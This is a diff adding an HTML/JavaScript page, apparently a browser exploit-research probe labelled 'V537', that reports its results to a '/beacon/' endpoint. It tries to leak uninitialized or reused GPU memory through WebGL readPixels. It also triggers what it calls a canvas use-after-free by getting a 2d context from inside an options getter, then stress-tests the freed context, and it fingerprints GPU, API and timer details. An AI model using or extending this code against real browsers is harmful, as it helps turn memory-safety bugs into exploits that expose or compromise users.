@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V537</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<video id="vid" width="1" height="1" muted></video>
+<div id="log">V537 — Info-first mega probe (WebGL→Audio→APIs→MSE→Canvas)
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V537-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// ===== SECTION A: WebGL + uninitialized GPU memory (HIGHEST PRIORITY) =====
+setTimeout(function(){
+  try{
+    var cv=document.createElement('canvas');cv.width=64;cv.height=64;
+    var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
+    if(!gl){B('A-NO-WEBGL','webgl unavailable');return}
+    B('A-WEBGL',gl.getParameter(gl.VERSION)+' / '+gl.getParameter(gl.RENDERER));
+    var ext=gl.getSupportedExtensions();
+    B('A-EXT','n='+ext.length+': '+ext.slice(0,15).join(','));
+    var db=gl.getExtension('WEBGL_debug_renderer_info');
+    if(db)B('A-GPU',gl.getParameter(db.UNMASKED_RENDERER_WEBGL)+' / '+gl.getParameter(db.UNMASKED_VENDOR_WEBGL));
+
+    // Uninitialized framebuffer reads — 8 rounds at 64x64
+    var allNZ=[];
+    for(var r=0;r<8;r++){
+      var fb=gl.createFramebuffer();
+      var tex=gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D,tex);
+      gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,64,64,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+      gl.bindFramebuffer(gl.FRAMEBUFFER,fb);
+      gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex,0);
+      var pix=new Uint8Array(64*64*4);
+      gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,pix);
+      var nz=0;for(var i=0;i<pix.length;i++)if(pix[i]!==0)nz++;
+      allNZ.push(nz);
+      if(nz>0&&r<3){
+        var s=[];for(var i=0;i<Math.min(32,pix.length);i++)s.push(('0'+pix[i].toString(16)).slice(-2));
+        B('A-STALE-'+r,nz+'/'+pix.length+' first32='+s.join(' '));
+      }
+      gl.deleteFramebuffer(fb);gl.deleteTexture(tex);
+    }
+    B('A-UNINIT','nonzero per round: ['+allNZ.join(',')+']');
+
+    // GPU memory reuse test: fill with 0xDE pattern, delete, re-alloc, read
+    var tex2=gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D,tex2);
+    var fill=new Uint8Array(32*32*4);
+    for(var i=0;i<fill.length;i++)fill[i]=0xDE;
+    gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,32,32,0,gl.RGBA,gl.UNSIGNED_BYTE,fill);
+    gl.deleteTexture(tex2);
+    var tex3=gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D,tex3);
+    gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,32,32,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+    var fb2=gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER,fb2);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex3,0);
+    var pix2=new Uint8Array(32*32*4);
+    gl.readPixels(0,0,32,32,gl.RGBA,gl.UNSIGNED_BYTE,pix2);
+    var deCount=0;for(var i=0;i<pix2.length;i++)if(pix2[i]===0xDE)deCount++;
+    B('A-REUSE','0xDE count='+deCount+'/'+pix2.length+' (>0=GPU memory reuse!)');
+    gl.deleteFramebuffer(fb2);gl.deleteTexture(tex3);
+
+    // RAB through WebGL
+    try{
+      var rab=new ArrayBuffer(64*64*4,{maxByteLength:64*64*4*2});
+      var rv=new Uint8Array(rab);
+      gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,rv);
+      B('A-RAB','readPixels with RAB WORKED! [0]='+rv[0]);
+    }catch(e){B('A-RAB','REJECTED: '+e)}
+
+    // Larger uninitialized read at different sizes to catch lazy clear
+    var sizes=[128,256,512];
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      var cv2=document.createElement('canvas');cv2.width=sz;cv2.height=sz;
+      var gl2=cv2.getContext('webgl');
+      if(!gl2)continue;
+      var fb3=gl2.createFramebuffer();
+      var tex4=gl2.createTexture();
+      gl2.bindTexture(gl2.TEXTURE_2D,tex4);
+      gl2.texImage2D(gl2.TEXTURE_2D,0,gl2.RGBA,sz,sz,0,gl2.RGBA,gl2.UNSIGNED_BYTE,null);
+      gl2.bindFramebuffer(gl2.FRAMEBUFFER,fb3);
+      gl2.framebufferTexture2D(gl2.FRAMEBUFFER,gl2.COLOR_ATTACHMENT0,gl2.TEXTURE_2D,tex4,0);
+      var bigPix=new Uint8Array(sz*sz*4);
+      gl2.readPixels(0,0,sz,sz,gl2.RGBA,gl2.UNSIGNED_BYTE,bigPix);
+      var bnz=0;for(var i=0;i<bigPix.length;i++)if(bigPix[i]!==0)bnz++;
+      B('A-BIG-'+sz,'nonzero='+bnz+'/'+bigPix.length);
+      gl2.deleteFramebuffer(fb3);gl2.deleteTexture(tex4);
+    }
+
+    B('A-DONE','webgl complete');
+  }catch(e){B('A-ERR',''+e)}
+},50);
+
+// ===== SECTION B: Web Audio =====
+setTimeout(function(){
+  try{
+    var AC=window.AudioContext||window.webkitAudioContext;
+    if(!AC){B('B-NO-AUDIO','unavailable');return}
+    var ac=new AC();
+    B('B-AUDIO','sr='+ac.sampleRate+' state='+ac.state+' dest.maxCh='+ac.destination.maxChannelCount);
+    B('B-WORKLET',ac.audioWorklet?'YES':'NO');
+    try{var sp=ac.createScriptProcessor(4096,1,1);B('B-SPN','YES');sp.disconnect()}
+    catch(e){B('B-SPN','NO: '+e)}
+    try{var an=ac.createAnalyser();B('B-ANALYSER','YES fft='+an.fftSize)}
+    catch(e){B('B-ANALYSER','NO')}
+    try{var oac=new OfflineAudioContext(1,44100,44100);B('B-OFFLINE','YES')}
+    catch(e){B('B-OFFLINE','NO')}
+    var ab=ac.createBuffer(1,4096,ac.sampleRate);
+    var cd=ab.getChannelData(0);
+    B('B-CD','type='+cd.constructor.name+' buf.bl='+cd.buffer.byteLength+' resizable='+(cd.buffer.resizable||false));
+    ac.close();
+  }catch(e){B('B-ERR',''+e)}
+},400);
+
+// ===== SECTION C: API fingerprint + timer resolution =====
+setTimeout(function(){
+  try{
+    var apis={};
+    var ck=function(n,f){try{apis[n]=f()}catch(e){apis[n]='ERR'}};
+    ck('WebGL2',function(){var c=document.createElement('canvas');return c.getContext('webgl2')?'YES':'NO'});
+    ck('ResizeObs',function(){return typeof ResizeObserver});
+    ck('IntersectObs',function(){return typeof IntersectionObserver});
+    ck('PerfObs',function(){return typeof PerformanceObserver});
+    ck('MutationObs',function(){return typeof MutationObserver});
+    ck('CSSpaint',function(){return CSS&&CSS.paintWorklet?'YES':'NO'});
+    ck('CSSTypedOM',function(){return typeof CSSStyleValue});
+    ck('Gamepad',function(){return typeof Gamepad});
+    ck('hwConc',function(){return navigator.hardwareConcurrency});
+    ck('devMem',function(){return navigator.deviceMemory||'undef'});
+    ck('locks',function(){return typeof navigator.locks});
+    ck('caches',function(){return typeof caches});
+    ck('crypto',function(){return typeof crypto.subtle});
+    ck('Intl.Seg',function(){return typeof Intl.Segmenter});
+    ck('structClone',function(){return typeof structuredClone});
+    ck('Streams',function(){return typeof ReadableStream+'/'+typeof WritableStream+'/'+typeof TransformStream});
+    ck('compress',function(){return typeof CompressionStream});
+    ck('WASM',function(){return typeof WebAssembly});
+    ck('SAB',function(){return typeof SharedArrayBuffer});
+    ck('Atomics',function(){return typeof Atomics});
+    ck('WeakRef',function(){return typeof WeakRef});
+    ck('FinReg',function(){return typeof FinalizationRegistry});
+    ck('rIC',function(){return typeof requestIdleCallback});
+    ck('BroadcastCh',function(){return typeof BroadcastChannel});
+    ck('WebRTC',function(){return typeof RTCPeerConnection});
+    ck('Speech',function(){return typeof SpeechSynthesis});
+    ck('Payment',function(){return typeof PaymentRequest});
+    ck('Clipboard',function(){return typeof navigator.clipboard});
+    ck('OffscreenCanvas',function(){return typeof OffscreenCanvas});
+    ck('createImgBitmap',function(){return typeof createImageBitmap});
+    var summary=[];for(var k in apis)summary.push(k+'='+apis[k]);
+    B('C-APIS',summary.join(' | '));
+  }catch(e){B('C-ERR',''+e)}
+
+  try{
+    var t1=performance.now();var s=0;for(var i=0;i<500000;i++)s+=i;
+    var t2=performance.now();
+    B('C-TIMER','500K loop: '+(t2-t1)+'ms');
+  }catch(e){}
+
+  try{
+    if(performance.memory)
+      B('C-MEM','limit='+performance.memory.jsHeapSizeLimit+' used='+performance.memory.usedJSHeapSize);
+    else B('C-MEM','NO');
+  }catch(e){B('C-MEM','ERR')}
+},700);
+
+// ===== SECTION D: MSE compat fMP4 =====
+setTimeout(function(){
+  try{
+    B('D-START','MSE compat fMP4');
+    fetch('/test-frag-compat.mp4').then(function(r){
+      if(!r.ok)throw new Error('HTTP '+r.status);
+      return r.arrayBuffer();
+    }).then(function(ab){
+      var d=new Uint8Array(ab);
+      B('D-FETCHED','size='+d.length);
+      var initEnd=0,off=0;
+      while(off<d.length-8){
+        var sz=(d[off]<<24)|(d[off+1]<<16)|(d[off+2]<<8)|d[off+3];
+        var tp=String.fromCharCode(d[off+4],d[off+5],d[off+6],d[off+7]);
+        if(sz<8)break;
+        if(tp==='moof'&&!initEnd)initEnd=off;
+        off+=sz;
+      }
+      var ms=new MediaSource();
+      var vid=document.getElementById('vid');
+      vid.src=URL.createObjectURL(ms);
+      ms.addEventListener('sourceopen',function(){
+        B('D-OPEN','ok');
+        var sb;
+        try{sb=ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');B('D-SB','ok')}
+        catch(e){B('D-SB-ERR',''+e);return}
+        var phase=0;
+        sb.addEventListener('updateend',function(){
+          phase++;
+          if(phase===1){
+            B('D-INIT-DONE','buf.len='+sb.buffered.length);
+            sb.appendBuffer(d.slice(initEnd).buffer);
+          }else if(phase===2){
+            var bl=-1;
+            try{bl=sb.buffered.length}catch(e){B('D-BUF-ERR',''+e)}
+            B('D-MEDIA-DONE','buf.len='+bl);
+            if(bl>0)for(var i=0;i<bl;i++)
+              B('D-RANGE-'+i,sb.buffered.start(i)+'-'+sb.buffered.end(i));
+            try{ms.endOfStream()}catch(e){}
+          }
+        });
+        sb.addEventListener('error',function(){B('D-SB-ERROR','error')});
+        B('D-INIT','bytes 0-'+initEnd);
+        sb.appendBuffer(d.slice(0,initEnd).buffer);
+      });
+    }).catch(function(e){B('D-FETCH-ERR',''+e)});
+  }catch(e){B('D-ERR',''+e)}
+},1200);
+
+// ===== SECTION E: Canvas UAF liveness — NO save() first =====
+setTimeout(function(){
+  try{
+    B('E-START','canvas UAF liveness (no save)');
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var ctx=null,s={};
+    Object.defineProperty(s,'alpha',{get:function(){ctx=c.getContext('2d');return true}});
+    var outer=c.getContext('bitmaprenderer',s);
+    if(!ctx){B('E-FAIL','no ctx');return}
+    B('E-UAF','triggered');
+
+    // Read/write state — NO save/restore
+    var lw=ctx.lineWidth;
+    ctx.lineWidth=1337.42;var lw2=ctx.lineWidth;
+    var ga=ctx.globalAlpha;ctx.globalAlpha=0.5;var ga2=ctx.globalAlpha;
+    ctx.setLineDash([5,3]);var ld=ctx.getLineDash();
+    var fs=ctx.fillStyle;
+    ctx.fillStyle='#ff0000';var fs2=ctx.fillStyle;
+    B('E-STATE','lw='+lw+'→'+lw2+' ga='+ga+'→'+ga2+' dash=['+ld+'] fs='+fs+'→'+fs2);
+
+    // Re-get test
+    var ctx2=c.getContext('2d');
+    var bmr2=c.getContext('bitmaprenderer');
+    B('E-REGET','2d='+(ctx2===null?'null':ctx2===ctx?'SAME':'DIFF')+
+      ' bmr='+(bmr2===null?'null':bmr2===outer?'SAME':'DIFF'));
+
+    // getTransform
+    try{
+      var t=ctx.getTransform();
+      B('E-XFORM','a='+t.a+' d='+t.d+' e='+t.e+' f='+t.f);
+    }catch(e){B('E-XFORM-ERR',''+e)}
+
+    // measureText
+    try{
+      var m=ctx.measureText('test');
+      B('E-MEASURE','width='+m.width);
+    }catch(e){B('E-MEASURE-ERR',''+e)}
+
+    // createLinearGradient
+    try{
+      var g=ctx.createLinearGradient(0,0,100,100);
+      g.addColorStop(0,'red');g.addColorStop(1,'blue');
+      ctx.fillStyle=g;
+      B('E-GRADIENT','ok');
+    }catch(e){B('E-GRADIENT-ERR',''+e)}
+
+    // isPointInPath
+    try{
+      ctx.beginPath();ctx.rect(0,0,10,10);
+      var ip=ctx.isPointInPath(5,5);
+      B('E-PATH','isPointInPath(5,5)='+ip);
+    }catch(e){B('E-PATH-ERR',''+e)}
+
+    window._ctx537=ctx;window._c537=c;
+    B('E-ALIVE','all state ops work without save/restore');
+  }catch(e){B('E-ERR',''+e)}
+},4000);
+
+// ===== SECTION F: Canvas save() crash test (LAST — may crash page) =====
+setTimeout(function(){
+  try{
+    if(!window._ctx537){B('F-SKIP','no ctx');return}
+    B('F-START','testing save() — may crash');
+
+    // Beacon right before save() to confirm we reach this point
+    B('F-PRE-SAVE','about to call save()');
+
+    try{
+      window._ctx537.save();
+      B('F-SAVE-OK','save() succeeded!');
+    }catch(e){B('F-SAVE-ERR',''+e)}
+
+    try{
+      window._ctx537.restore();
+      B('F-RESTORE-OK','restore() succeeded');
+    }catch(e){B('F-RESTORE-ERR',''+e)}
+
+    B('F-SURVIVED','save/restore did NOT crash');
+  }catch(e){B('F-ERR',''+e)}
+},6000);
+
+// ===== SECTION G: Canvas drawing ops (may crash if context corrupted) =====
+setTimeout(function(){
+  try{
+    if(!window._ctx537){B('G-SKIP','no ctx');return}
+    B('G-START','drawing operations');
+
+    try{
+      window._ctx537.fillRect(0,0,1,1);
+      B('G-FILLRECT','ok');
+    }catch(e){B('G-FILLRECT-ERR',''+e)}
+
+    try{
+      window._ctx537.strokeRect(0,0,1,1);
+      B('G-STROKERECT','ok');
+    }catch(e){B('G-STROKERECT-ERR',''+e)}
+
+    try{
+      window._ctx537.clearRect(0,0,1,1);
+      B('G-CLEARRECT','ok');
+    }catch(e){B('G-CLEARRECT-ERR',''+e)}
+
+    try{
+      var id=window._ctx537.getImageData(0,0,1,1);
+      B('G-GETIMAGE','data=['+id.data[0]+','+id.data[1]+','+id.data[2]+','+id.data[3]+']');
+    }catch(e){B('G-GETIMAGE-ERR',''+e)}
+
+    try{
+      var url=window._c537.toDataURL();
+      B('G-DATAURL','len='+url.length);
+    }catch(e){B('G-DATAURL-ERR',''+e)}
+
+    B('G-DONE','all drawing ops tested');
+  }catch(e){B('G-ERR',''+e)}
+},7500);
+
+setTimeout(function(){B('COMPLETE','all sections done')},12000);
+</script></body></html>
